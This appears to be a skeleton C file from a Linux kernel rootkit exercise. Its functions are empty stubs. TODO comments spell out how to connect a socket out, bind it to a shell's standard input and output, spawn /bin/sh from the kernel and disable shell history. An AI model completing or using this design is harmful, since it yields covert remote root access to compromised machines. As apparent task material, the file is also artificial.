// SPDX-License-Identifier: GPL-2.0
// execution/shell.c - Interactive and exec shells via usermodehelper.
#include <linux/err.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/mutex.h>
#include <linux/net.h>
#include <linux/string.h>
#include <linux/umh.h>
#include <linux/workqueue.h>

#include "rootkit.h"

/*
 * TODO: Define struct rk_shell with fields:
 *   - struct mutex lock
 *   - bool busy
 *   - struct socket *sock
 *   - struct file *file
 *   - struct delayed_work timeout_work
 *   - unsigned long timeout_jiffies
 *   - char cmd[RK_CMD_MAX]
 *
 * Declare two static instances: interactive_shell and exec_shell.
 * Declare shell_envp: HOME=/, PATH, TERM=linux, HISTFILE=/dev/null.
 */

/*
 * TODO: Implement rk_shell_timeout_fn (delayed_work callback).
 *
 * If the shell is busy and has a socket, shut it down with
 * kernel_sock_shutdown(shell->sock, SHUT_RDWR).
 */

/*
 * TODO: Implement rk_shell_init_one to initialize a single rk_shell.
 *
 * mutex_init, set busy=false, sock=NULL, file=NULL,
 * timeout_jiffies = msecs_to_jiffies(shell_timeout_ms),
 * INIT_DELAYED_WORK.
 */

/*
 * TODO: Implement rk_install_fd.
 *
 * get_unused_fd_flags(0), check it matches wanted fd number,
 * get_file + fd_install. Return -EBUSY if fd doesn't match.
 */

/*
 * TODO: Implement rk_shell_init_fn (subprocess_info callback).
 *
 * Install shell->file as fd 0, 1, 2 using rk_install_fd.
 */

/*
 * TODO: Implement rk_shell_make_file.
 *
 * sock_alloc_file(shell->sock, 0, NULL) to wrap the socket
 * in a struct file for fd installation.
 */

/*
 * TODO: Implement rk_shell_release.
 *
 * Cancel the timeout, then fput the file (which releases the socket)
 * or sock_release if there is no file.
 */

/*
 * TODO: Implement rk_shell_spawn (static).
 *
 * 1. rk_connect to get a new socket for shell I/O.
 * 2. rk_shell_make_file.
 * 3. Arm the timeout with mod_delayed_work.
 * 4. call_usermodehelper_setup("/bin/sh", argv, shell_envp, ...).
 * 5. call_usermodehelper_exec with UMH_WAIT_PROC.
 */

/*
 * TODO: Implement rk_interactive_work (work_struct callback).
 *
 * Spawn /bin/sh -i, then rk_shell_release + clear busy.
 */

/*
 * TODO: Implement rk_exec_work (work_struct callback).
 *
 * Spawn /bin/sh -c <shell->cmd>, then release + clear busy + clear cmd.
 */

/*
 * TODO: Declare two static DECLARE_WORK items for the above functions.
 */

/*
 * TODO: Implement rk_shell_stop (static).
 *
 * Shut down the socket if present, cancel the timeout.
 */

/*
 * TODO: Implement rk_shells_init.
 *
 * Init both shell instances.
 */
void rk_shells_init(void)
{
}

/*
 * TODO: Implement rk_shells_cleanup.
 *
 * Stop both shells, cancel both work items.
 */
void rk_shells_cleanup(void)
{
}

/*
 * TODO: Implement rk_start_interactive.
 *
 * Lock, check not busy, set busy = true, schedule_work.
 * Return -EBUSY if already active.
 */
int rk_start_interactive(void)
{
	return -ENOSYS;
}

/*
 * TODO: Implement rk_start_exec.
 *
 * Validate cmd (non-null, non-empty, < RK_CMD_MAX).
 * Lock, check not busy, copy cmd, set busy, schedule_work.
 * Return -EBUSY if active, -EINVAL/-E2BIG on bad input.
 */
int rk_start_exec(const char *cmd)
{
	return -ENOSYS;
}
